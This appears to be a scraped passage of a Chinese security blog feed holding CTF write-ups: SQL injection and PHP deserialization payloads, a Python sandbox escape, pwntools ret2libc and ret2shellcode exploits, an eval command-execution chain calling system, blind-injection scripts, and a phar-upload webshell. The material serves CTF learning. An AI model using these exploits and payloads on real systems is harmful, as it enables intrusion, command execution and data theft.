1?no=0%20union/**/select%201,data,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;%27%20from%20users 将得到的页面内容进行base64解密后获得flag misc字符偏移考察 Linux 文件重定向 flag{You_F0und_4_Supr1s3_1n_These_Bug5:)} 环境部署： 1.服务端运行 python server.py， 并修改 client.c 中的 ip 和 port2.编译 gcc client.c -o bugProgram 并下发 题解： ./bugProgram 1&gt;/dev/null 即可得到 flag 也可以 wireshark 抓取流量, 再分析程序流程还原 flag sandbox考察 Python3 沙盒绕过 flag{Awes0me_Pyth0n_&amp;_Aw3s0me_Cl4ss} 环境部署： 修改 flag 权限防止搅屎 chmod o-w flag.txt 服务端执行 socat tcp-listen:8999,fork exec:&quot;./run.sh&quot;,stderr 做题通过 nc ip 8999 题解： Fuzz 之后发现限制了 import system os bash sh 等关键字, 使用 Python 内建函数以及类的继承绕过限制, 执行 cat flag.txt. Payload:print(&#39;&#39;.&#39;&#39;.__class__.__mro__[1].__subclasses__()[93].__init__.__globals__[&#39;sys&#39;].modules[&#39;o&#39;+&#39;s&#39;].spawnlp(0, &#39;cat&#39;, &#39;cat&#39;, &#39;flag&#39;))其中 __subclasses__()[93] 是 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; 的索引， 视具体情况而定s = &#39;&#39;.__class__.__mro__[1].__subclasses__()for i in s: print(str(i) + &#39; &#39; + str(s,index(i))) 图片隐写考察png的基本格式首先把图片开头的几个nop删掉，然后得到图片之后修改图片宽度，得到写有flag的图片python脚本如下： 123456for i in range(16,256): b=hex(i)[2:] a=('89504E470D0A1A0A0000000D49484452000003'+b+'000001530802000000989E251C000000017352474200AECE1CE90000000467414D410000B18F0BFC61050000000970485973000012740000127401DE661F7800000B0349444154785EEDDD4B76A3C81200D0DA80861A6BA89987F5F6BFB3973F10E447266D49B6AAEF9D741982CC48A04F4421E4FA030000000000000000000000000000000000000000000000F0DF743A5F2ED7E47C8A3F9ECE51FC23BC3DF73300FF98D3E5E3EFDFFF2DAEE7B0E97CFD1B7C5C5E56EE62797DC7DA7AEB7A93CBE57CD222FC3E0FBC9FE38DEA1203F0B362EF169AB650DA42554AC2C657766FE7EB92C05B15C553C83BB5BBB5D4FEF2AB3CEE7E5EFEAAF3E13203F06352356A0ADBEBBAB73053A8857F43317CA7DEADB4BCA98A5FD28772D1E5121AD1BFBBB21E7BBC8F776B4CFF3D8FBC9F4FE7D2C0E9DF00F821A57BAB2AD1CBBAB73CFDBB7537E76B28DE87D2CE91BAB71FF6E8FB395F56ED1B003FA334223FD5BDE589DEAC0C8696F3684FA67BFB151E7D3FE7BF74E8DE0078B5FC3DBCDC8884C2963EFB5BBE3A30A876E190F48EFE4770BDDE7B433F076EC3F2B7FEEACF47BBDDDBEE1B82F97B0179A43054DAB655076FB24B9B5A47731B3AD4BDE5314BE4FAF16A73C6F2295D53FE7ECE9F5FA3F93316A3CAFC31EE4E607028D56D0E25E1DD67E7F3ABC8CB1864B7BB9FD3D0EBC0697FB2A4D91E1E94D9CA3EDD1B003F233D16AA2C05AEEDDEFA2FE9C7F7D54AC0AA1319DB977EC7D3EDDED6D96391CC23AC06237482C3C626B9A9DCC6965377E788DCE155AA95B63129E76ACCE3391FBC4653672C24195FE62B118B5E9EC1F154D71CC21165F0E5DC7C7715C17EAEE05EF03A6EBE1CCDB151D9B50D0DE3B5270B009E2B3FBCC8652994ACF46C617996B156BBF45314EBD5477C86541E3F9C9677B7AB1A168ECC03A6D064898CDBFB65B55F983FC261FB61CA20BBF05DF0121B3B8E18D984A68D0773BBE3D604C433D73D2C3FAC290D419830BB3DD8290D414A3A6F28C1FB3C66723E788D26CE584E32B87D23390CBA7457ED650B1B8FA55A72B8C6CEB09C9DCB250FF795556C272CD37DBEE4D238DE961C678E61CD7D107784C8DB9039B25A3F00BCC8D1F7DE62B92B7F5CB52F75A5AAB6AB73D9B2BDA98C79A2CEECBDACE23069FB769425B81AB9CD643AB7FB62BF138ECA52FF5076EC8CDE7B4B93B68D4259E09AE25CCEC7AED1F7CF581AA21E612ED5E1259E5EC5436F92B2AE6AC814B69B286F697307805738DABDF53455AD14CEDE71A52E56BBFACD4DA9B5836176E5B6B7258BC96D0799CEED80F41C2A1E9BAD8FD16E06DD5B49A62DFFFB53FA809CF703260F3863CBB0B77D93A9961CBA63778C573198B05AE0274BBE6DEFFDEF90F3DF4F1407ACC200E05526BBB753FC40707D833D56B5EDB1BD3A57B4D53D753EDD5986B307CD14C3E02A722AB729F123B8A587AB07E9776FA569281F196E9573524EE9D772BE7F8D0E9FB125C9DEECEBDE75DCC954630EDBC35B5F5E45D024330CEE46EE13EB1FBB2C2A5CC2B205005EE570F7965E138A856DD5D4D4BAA26F3525BC04779E570DEA65D62DB7070AF3546E5F3078E3EA6EF736B29CD2E99C0F5CA3E001676CDD7B24B897EA3087E09BAB08F60B090E2E392AD9AE53E52BD82E2CBD8E571D0B002F71B07B2B61E5FDF0B23196EC603D76B68487329DAA727DC0B0D6064DB91D06EF236773FB8A32CE763D77BBB7D0B90EE4533C99F3A16B143CE08CDD967020B893EA3887EFAF22D82F2438B8E4643F570E68D6B5AEB7373D003CD7A1EEADD4AABAFAD535751096847D71A26A5F1EA13E60586BF3AE5435CBCF778273DD5D76CCE7F6057939DB81FADD5B95DBC854CE83E092D2F6FA1E3C63F7938C8384BDCBB853A906A31C1EB08A26B760181C76B4D3E58DE9F07CE076DE24E7D39D1C009EEE50F7167FDC97C3A854E5CDB1BD3A9D95AADCECEA56C7325D6798E5C1CC664F95EA4DD8B11D643EB779EDC91C746FE3647666723E7A8DA6CF587D759266A533A906A31CE656113676979182B77B8E2EB9C8235CCF79DECE61714DFD130300CFD7361C5155ED4A01DE95B154C0EA63978DFB82573E218DC16D9D8C1375668FC155741C266DDF8557A9DEE4496F3BA6731B0A23A5DF1A567E2CD2EB5A719C6D7AFDD33B4A263A9D37BF7C6422E7185A472E87EF13387CC652643CBCFA8070B910DDB9F6E38E4EEF2887B955A48DED8469FBD76E9222C75FAFF13F9DA3724AED5505809738D4BDC56A15C2629DFB08252D7E0F30FE39FDAED5EAD83532FEC6D51C9A86CA8734A5B094C9EEECF95DF5ED8C7184CF525D851DF1F0CD8EC9DC866EE3C424E33039D5BC653F4A4C2F6ECF137EDCBEA1B81D24ED8B723EDB118EE7BC466ECF588C8BF1DB933671C6E2A04B93B464B9E6530F703CD53B39CCAEE2E13749B6594B7B50392DF52400F022C7BAB750AFCE4B69CCE2BE5CC39A2256FDDB4AA17C9F536CFC731D9B271ACDDE4C7AEDD6DF1C5C7E5E750BF34C6E63CBBF4C50496FDA97909BCD3728AB95C6E56D9209623B523DE89AC8F9E0359A3B6339CB3C60168EED2E34389CEA3087F9553CFE2689D28C61D72EEB55CEA7BF0F007E97F87BF06FDF04BCAB842EB1BD121EE4B25A6DAD6A6D19E8D0ACC794013FC9ED736598A86C19B91794F74565435709F93CE77DDCC394618F0C5C023F4FF58EFD101D4FBE49727F364A7A7931AEFC0800FFA2580C43C16B1E72E422596D1E3E29798E516EBFD91BE5FCA4549F7B9384D1EFF4676149EF76C300C0ACF2F96CAFDEA55DB116DE3E317C6DF77627B75FEB8D727E56AA4FBD49C6832F9F23BFD90D030063A1ECE5DFB35A7E8EE56E79176AF8242314C48F8F4D357C5261FE4A6E3FED8D727E71AA4FBA4982F2B0B09F73DCD97B391100DE56ACA9A1F2B566EADD930AF3C1DC4EF1DFD61C7BED1397879CCFD77871AA4FB84996C7C0C153DA4200F8A54EF1894BFA97C58BEB65F005C5A1F42C2E1CF7F0FA7928B73CFBD0AB1F783DE07CBECA4B537DC24DB25CF9D1376A01000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FE4BFEFCF93F29520FC4D05FB0A10000000049454E44AE426082').decode(\"hex\") f=open('1\\\\'+b+'.png',\"wb\") f.write(a) f.close() reversepatch考察 IDAPatch 的使用 flag{why_need_so_large_ram_emmmmmmm} 环境搭建： 直接下发 fakeRam 程序 题解： 利用 IDAPatch nop 掉所有严重与等待后重新运行即可自动输出 flag c++STL考察c++STL容器基础 开始创建三个vector容器第一个放入输入的16个数字第二个放入从500开始的16个素数第三个倒序放入第一个容器的16个数字比较第三和第二个容器相等则得到flag cryptosha25612345678910111213141516171819202122from hashlib import sha256sssk=string.printabletext2=\"sha256_is_too_\"text1=\"6348306011488e60120a6b99fbbb13f09336235fb790f8f904e97846b1418e48\"#sha256_is_too_e@$Yfor i1 in sssk: for i2 in sssk: for i3 in sssk: for i4 in sssk: text3=text2+i1+i2+i3+i4 if sha256(text3).hexdigest()==text1: text4=i1+i2+i3+i4 print i1+i2+i3+i4 break else: continue else: continue break else: continue break else: continue breakprint text3 得到flag DES考察简化的DES差分分析 round1.py123456789101112131415161718192021222324252627282930313233343536373839404142434445#SBOX = [[[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7], [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8], [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0], [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]], [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10], [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5], [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15], [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]], [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8], [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1], [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7], [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]], [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15], [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9], [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4], [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]], [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9], [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6], [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14], [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]], [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11], [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8], [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6], [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]], [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1], [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6], [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2], [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]], [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7], [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2], [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8], [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]]]#为了方便这里只选择SBOX中的S1盒进行演示def Sbox(a,b): sbox1=[[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7], [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8], [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0], [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]] #存储S1盒output的异或值 sout_table=[0] sout_text=[''] for i in range(0,64*16): sout_table.append(0) for i in range(0,64*16): sout_text.append('') for Si in range(0,64): for Se1 in range(0,64): Se2=Se1^Si #计算Se1经过S1盒的值 bits1 = bin(Se1).replace('0b','').rjust(6,'0') row1 = int(bits1[0])*2+int(bits1[5]) col1 = int(bits1[1])*8+int(bits1[2])*4+int(bits1[3])*2+int(bits1[4]) val1 = bin(sbox1[row1][col1])[2:] #计算Se2经过S1盒的值 bits2 = bin(Se2).replace('0b','').rjust(6,'0') row2 = int(bits2[0])*2+int(bits2[5]) col2 = int(bits2[1])*8+int(bits2[2])*4+int(bits2[3])*2+int(bits2[4]) val2 = bin(sbox1[row2][col2])[2:] So=int(val1,2)^int(val2,2) #将相应表项加1 sout_table[Si*16+So]=sout_table[Si*16+So]+1 sout_text[Si*16+So]=sout_text[Si*16+So]+str(Se1).zfill(2) ''' for i in range(0,64): s=str(i)+\" : \" for j in range(0,16): s=s+str(sout_table[i*16+j])+\" \" print(s) '''# print(sout_text[a*16+b]) return sout_text[a*16+b] 1234567891011121314151617181920212223242526272829303132333435363738394041from round1 import *from des import *def decry_xor(decry1,decry2,num): a=decry1[num*4:num*4+4] b=decry2[num*4:num*4+4] return int(a,2)^int(b,2)def en_xor(number1,number2,number3): num1=E_change(bin(chain[number1])[2:].zfill(32),number3) num2=E_change(bin(chain[number2])[2:].zfill(32),number3) return num1^num2,num1,num2subkey=bin(0x987654321098)[2:]print(subkey)chain=[0x92d91525,0x81c82636,0xa3d71597,0xc2a41239,0xa4824698,0x45681249]#密文#0x6148b286 #0x7d4d21d3 #0xaecabffe #0x74d08779 #0xc8e3d2a4 #0x8d9d872f cipher=['01100001010010001011001010000110','01111101010011010010000111010011','10101110110010101011111111111110','01110100110100001000011101111001','11001000111000111101001010100100','10001101100111011000011100101111']'''for i in range(6): plaintext=bin(chain[i])[2:].zfill(32) cipher[i]=(F(plaintext,subkey))print(cipher)'''en_xo=[[],[],[]]def getkey(a,b,c): en_xo=en_xor(a,b,c) #print(en_xo) de_xo=decry_xor(cipher[a],cipher[b],c) result=Sbox(en_xo[0],de_xo)# print(result) resu=['','','','','','','','','','','','','','','','','','','','','','','','','','','',''] for i in range(int(len(result)/2)): resu[i]=(result[2*i]+result[2*i+1]) print(\"key:\") for i in range(int(len(result)/2)): print(en_xo[1]^int(resu[i])) # print(en_xo[2]^int(resu[i]))a=int(input())#第a+1个明文b=int(input())#第b+1个明文c=int(input())#明文的第c+1至c+5个bit位getkey(a,b,c) 根据明文和密文，每两对4bit的明文和6bit的密文可以获得一组key，多组明文密文的组合可以得到做个key的集合，最后几个集合的交集就是key，8个key合在一起就是subkey，有了key就可以进行解密，然后得到明文flag pwn001考察基础的ret2libc和ret2plt 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import * #context.log_level = 'debug' s=process(\"./pwn\") #gdb.attach(s) elf=ELF('./pwn',checksec=False) libc=ELF('/lib/i386-linux-gnu/libc.so.6',checksec=False) write_plt=elf.plt['write'] write_got=elf.got['write'] game_addr=elf.symbols['game'] write_libc_addr=libc.symbols['write'] system_addr=libc.symbols['system'] sh_addr=next(libc.search('/bin/sh')) payload='a'*88+p32(write_plt)+p32(game_addr)+p32(1)+p32(write_got)+p32(4) s.sendlineafter(\"name ?\\n\",payload) #gdb.attach(s) s.sendlineafter(\"? (0 - 1024)\\n\",\"123\")#gdb.attach(s) write_addr=u32(s.recvuntil(\"What'\")[-9:-5]) print hex(write_addr) base_addr=write_addr-write_libc_addr payload='a'*88+p32(system_addr+base_addr)+p32(game_addr)+p32(sh_addr+base_addr) s.sendlineafter(\"name ?\\n\",payload) s.sendlineafter(\"? (0 - 1024)\\n\",\"123\") s.interactive() 002考察基础的ret2shellcode 123456789from pwn import *sh=remote(&apos;172.20.3.35&apos;,9999)#sh = process(&apos;./Bin&apos;)shellcode = asm(shellcraft.i386.linux.sh())#buf2_addr = 0x0804853bhin_addr=0x080484ed#gdb.attach(sh)sh.sendline(&quot;a&quot;*108+shellcode[0:4] + p32(hin_addr)+shellcode[4:])sh.interactive()","categories":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"第十二届全国大学生信息安全竞赛-Web","slug":"第十二届全国大学生信息安全竞赛-Web","date":"2019-04-27T07:15:00.000Z","updated":"2019-05-20T00:52:32.337Z","comments":true,"path":"/posts/43152/","link":"","permalink":"https://Foxgrin.github.io/posts/43152/","excerpt":"第一次打国赛，emmm不得不说题目质量真的很高，一题都能卡学长一天，虽然一路跟着学长的思路复现下来，但是收获还是很多的，在这里做个复现的题解","text":"第一次打国赛，emmm不得不说题目质量真的很高，一题都能卡学长一天，虽然一路跟着学长的思路复现下来，但是收获还是很多的，在这里做个复现的题解 JustSoso根据源代码给出的提示，知道是先利用LFI读取index.php和hint.php的源码 12?file=php://filter/convert.base64-encode/resource=index.php?file=php://filter/convert.base64-encode/resource=hint.php 在index.php文件中，我们可以发现参数$_GET[&#39;payload&#39;]最后经过反序列化函数的处理，但是在之前将该参数经过parse_url函数的处理后的结果做了正则匹配过滤的处理，但是我们可以绕过parse_url函数，具体参考链接：http://www.am0s.com/functions/406.html 参考链接中提到，parse_url函数在处理///时会返回false 测试代码如下： 我们可以看到，当URI的开头为///时，parse_url是无法解析出URL的相关信息的，返回NULL 在官方文档中对该函数的注释： 123Note:parse_url() 是专门用来解析 URL 而不是 URI 的。不过为遵从 PHP 向后兼容的需要有个例外，对 file:// 协议允许三个斜线（file:///...）。其它任何协议都不能这样。 尽管该函数能解析不完整的URL，但是无法解析除file:///协议外的其他协议，当parse_url解析不出信息时，将返回NULL 如此一来，我们绕过了parse_url函数，即可执行反序列化函数，接下来就是要查看类中的具体信息了，类的信息就在hint.php文件中 我们可以看到两个类Handle和Flag，要得到flag，我们只能通过调用Flag类的getFlag()方法执行最后的highlight_file方法，但是，通过一次反序列化对象，我们是无法直接调用到该方法的，所以，只有通过Handle类的魔术方法__destruct，它在对象被销毁是自动调用，__constrct则是对象创建时自动调用，调用__destruct方法后才能调用getFlag()方法，所以Handle类的handle属性，必须是一个Flag对象 另外，我们可以注意到Handle类中还有一个魔术方法__wakeup，这是一个在对象被反序列化时会被自动调用的魔术方法，如果调用了，则会把对象中的所有属性置null，所以__wakeup就是我们必须要绕过的第二个地方，这里具体可以参考：https://mochazz.github.io/2018/12/30/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bug/ 里面提到了__wakeup魔术方法的一个bug，当我们将object size即类的对象个数改为比原有个数大时，__wakeup方法在对象被反序列化时就不会被调用 测试代码如下： 可以看到，正常情况下的反序列化会调用到__wakeup，将handle属性置null，导致无法执行getFlag方法，另外我们还可以注意到，稀有属性序列化后有特别的属性格式\\x00Handle\\x00handle 现在我们将对象个数1修改为比1大的数字，将上面代码的测试段修改为： 12$h = $_GET['h'];unserialize($h); 这里发现反序列化函数出现了报错，这是因为我这里测试的PHP版本为7.0过高的原因，可见这个Bug需要较低的PHP版本，将PHP版本修改为5.4后，再次执行 没有报错，说明成功了，但是这里没有读出内容，是因为要执行getFlag的最后读取文件，还有第三个约束条件 if($this-&gt;token === $this-&gt;token_flag) 如果按照正常的代码逻辑来看，两个的随机数的md5值是几乎不可能相等的，但是我们可以通过类似指针的原理，让$this-&gt;token = &amp;this-&gt;token_flag，这样$this-&gt;token的值会随着$this-&gt;token_flag值的改变而改变，生成最终的Handle对象的代码如下： 序列化后的Handle对象为：O:6:&quot;Handle&quot;:2:{s:14:&quot;\\x00Handle\\x00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;3ba716f4a7265eef381f7cef9e271f27&quot;;s:10:&quot;token_flag&quot;;R:4;}}，再结合前面分析的两个分别绕过__wakeup和parse_url 最终payload如下： 1http://xxx///index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:&#123;s:14:&quot;\\x00Handle\\x00handle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;3ba716f4a7265eef381f7cef9e271f27&quot;;s:10:&quot;token_flag&quot;;R:4;&#125;&#125; love_math在源码中发现calc.php，访问得到源代码，如下： 很明显，看到eval函数，这题考察的是命令执行拿flag，但是$content会先后经过黑白名单的校验并且长度不能大于等于80 黑名单是限制了我们输入的一些特殊字符，白名单则是限制了我们使用的函数 这里限制了我们只能使用数学函数，通过查阅各种数学函数的作用，发现能利用的只有base_convert，它能在2进制到36进制之间进行任意进制的转换，而36进制能表示字符0-9a-z，所以我们可以通过该函数来构造一些简单的函数，例如phpinfo，我们先把它转换成十进制 12echo base_convert(&apos;phpinfo&apos;, 36, 10);55490343972 这里大家可能有疑问，为什么一定要转化为十进制数，其实十进制以下都可以，但是十六进制就不行了，因为十六进制中会包含英文字母，而英文字母会在白名单校验中的正则匹配函数匹配到而执行失败 我们还可以执行一些其他命令，例如system(&#39;dir&#39;)：base_convert(1751504350,10,36)(base_convert(17523,10,36)) 可以看到目录下存在flag.php文件 但是，单靠一个base_convert函数，我们是无法构建出能读取flag.php文件的函数，因为base_convert函数只能构造出0-9a-z范围内的字符，例如空格，点号，都是无法通过进制转换进行构造的 所以这里想到用php的十六进制转字符串的函数hex2bin，但是该函数只使用与php7.0版本以上，正好该题目环境是7.0以上，所以该函数可以利用，同样用base_convert函数构造hex2bin：base_convert(37907361743,10,36)，该函数传入的参数必须是十六进制数，又因为十六进制数难免包含字母，这样会被白名单给过滤，所以我们可以再利用一个数学函数dechex，它能将十进制数转换为十六进制数，也就是说，我们可以通过base_convert(37907361743,10,36)(dechex())构造出函数hex2bin()，但是，这里eval语句最前面还有echo，如果构造system(hex2bin())，则需要调用到两次base_convert和一次dechex，而这样比然长度会超过80，所以应该这题要通过其他参数引入的方式来打破字符长度的限制 开始构造多$_GET传参 首先先通过传入的参数$c去定义一个变量，变量的值等于_GET，当然，这里变量名必须是数学函数，所以这里采用最短的pi作为变量名，这是为了尽可能的压缩长度，构造的payload为：$pi=base_convert(37907361743,10,36)(dechex(1598506324)) 上图即执行了语句eval(&#39;echo $pi=base_convert(37907361743,10,36)(dechex(1598506324));&#39;) 接下来，再通过$_GET[]($_GET[])进行多GET执行命令 但是这里黑名单过滤了[]，而{}是可以用来代替索引数组的 最终构造的payload如下： 1c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pow&#125;(($$pi)&#123;pi&#125;)&amp;pow=system&amp;pi=type%20flag.php 因为比赛环境关了的原因，本地测试采用的windows系统，linux系统将payload中的type改为cat即可 全宇宙最简单的SQL这题的waf会将|，or，sleep，if，benchmark，case等字符替换为QwQ 返回的信息有两种： SQL语法错误时，会显示数据库操作失败。例如：username=admin&#39;&amp;password=123 SQL语法正确时，如果账号密码不对，会显示登录失败。例如：username=admin&amp;password=123 排除了延时注入，报错注入，布尔注入。本题采用了一种基于语法的盲注，利用逻辑运算符和溢出报错来进行注入，这里采用了pow(9999,100)，这个表达式的值在MYSQL中已经超出了double范围，会溢出。然后构造以下payload来进行盲注： 1username=admin&apos; ^ 1 and substr(database(),1,1)=&apos;a&apos; and pow(9999,100)#&amp;password=123 在后台构成的SQL查询语句大致就是： 1select * from user where username='admin' ^ 1 and substr(database(),1,1)='a' and pow(9999,100)# and password='123'; 加入异或符号^是为了能够保证，即使admin用户名不存在，异或1的结果后仍然为true，保证能执行到后面的盲注判断语句substr()=&#39;&#39;。如果该判断语句为true，则会执行pow(9999,100)，产生溢出错误，页面返回的结果便是数据库操作失败；如果该判断语句为false，则不会执行pow(9999,100)，返回的结果为登录失败 通过这种盲注，我写了如下脚本： 1234567891011121314151617181920212223import requestsurl = \"http://39.106.224.151:52105/\"database = \"\"s = \"0123456789qwertyuiopasdfghjklzxcvbnm!@#$%^&amp;*()QWERTYUIOPASDFGHJKLZXCVBNM\"for i in range(1,50): for j in s: data = &#123; 'username':\"' ^ 1 and substr(database(),%d,1)='%s' and pow(9999,100)#\"%(i,j), 'password':'123' &#125; print(\"checking\",j) r = requests.post(url,data=data) r.encoding = r.apparent_encoding if '数据库操作失败' in r.text: passwd = passwd + j print(\"passwd:\",passwd) f = 1 break if j == 'M' and f == 0: break f = 0 注出数据库名：ctf 但是，题目将or替换QwQ，所以我们无法通过正常利用information_schema库来得到表名和列名信息 有篇参考文章：如何在不知道MySQL列名的情况下注入出数据 里面提到了，在无法知道列名的情况下，我们可以通过select 1,2 union select * from user来注出列下的所有内容，我们只需要猜测表名和查询列数即可 所以，构造以下payload即可注出密码字段的内容： 1username=admin&apos; ^ 1 and substr((select `2` from (select 1,2 union select * from user)a limit 1,1),1,1)=&apos;a&apos; and pow(9999,100)#&amp;password=123 脚本内容如下： 1234567891011121314151617181920212223import requestsurl = \"http://39.106.224.151:52105/\"password = \"\"s = \"0123456789qwertyuiopasdfghjklzxcvbnm!@#$%^&amp;*()QWERTYUIOPASDFGHJKLZXCVBNM\"for i in range(1,50): for j in s: data = &#123; 'username':\"' ^ 1 and substr((select `2` from (select 1,2 union select * from user)a limit 1,1),%d,1)='%s' and pow(9999,100)#\"%(i,j), 'password':'123' &#125; print(\"checking\",j) r = requests.post(url,data=data) r.encoding = r.apparent_encoding if '数据库操作失败' in r.text: password = password + j print(\"password:\",password) f = 1 break if j == 'M' and f == 0: break f = 0 最终注出的admin用户的密码f1ag@1s-at_/fll1llag_h3r3 但是仍然无法登陆，后面没有思路便作罢 赛后发现是存在大小写问题，必须在脚本中利用ASCII码进行判断，别的大佬的题解里写出跑出来的结果是F1AG@1s-at_/fll1llag_h3r3，登陆后，发现存在远程连接MySQL的功能，有点类似DDCTF的MYSQL弱口令那道题，一样是要伪造一个MYSQL服务器端来连接最终获取flag，但是由于题目环境关闭了，无法进行复现了，但是这题学习到了一种新型的基于语法的盲注和无法得知列名情况下的注入，收获也还是蛮大的 RefSpace题目的地址观察得知首先可以利用php伪协议读取源代码，再加上扫描后台以及读取源码中得到的提示，得出了题目的目录结构如下： 123456789101112➜ html tree.├── app│ ├── flag.php│ ├── index.php│ └── Up10aD.php├── backup.zip├── flag.txt├── index.php├── robots.txt└── upload2 directories, 7 files 其中注意到的便是网站有上传文件的功能，app/Up10aD.php源码如下： 分析源码可知，对上传的文件做了类型的检查，根据类型自动加上后缀名jpg或者gif 在index.php中，存在文件包含： 但是自动加上了后缀名php 一开始的想法是上传图片马，然后通过截断的方式包含图片马，但是尝试了%00，0x00，文件长度截断，都失败了，原因是该题目的php版本为7.0以上，而上述尝试的截断方式都仅仅适用于php5 所以，尝试了利用phar协议包含文件，具体可以参考：zip或phar协议包含文件 具体方法为，使用phar类打包一个phar标准包 12345&lt;?php$p = new PharData(dirname(__FILE__).'/phartest.zip', 0,'phartest',Phar::ZIP) ; $x=file_get_contents('./test.php');$p-&gt;addFromString('test.php', $x);?&gt; 运行后生成phartest.zip压缩包，里面包含了代码为&lt;?php phpinfo(); ?&gt; 的test.php文件 然后在app/Up10aD.php文件中上传该压缩包，并修改文件名为phartest，文件类型为image/jpeg， 这样，上传文件地址就为upload/phartest.jpg，然后访问https://xxx/index.php?route=phar://upload/phartest.jpg/test 即可成功执行phpinfo 同样方法上传一句话木马后getshell也只发现存在flag.txt和/ctf/sdk.php 没有其他思路了，只能就此作罢，后面考察的应该是要绕过app/flag.php中sha1比较，才能拿到flag","categories":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"DDCTF-Web","slug":"ddctf-Web","date":"2019-04-19T07:15:00.000Z","updated":"2019-04-19T14:18:29.885Z","comments":true,"path":"/posts/6882/","link":"","permalink":"https://Foxgrin.github.io/posts/6882/","excerpt":"这场比赛难度虽然大，但是一路做下来收获还是蛮大的","text":"这场比赛难度虽然大，但是一路做下来收获还是蛮大的 滴~题目链接：http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09 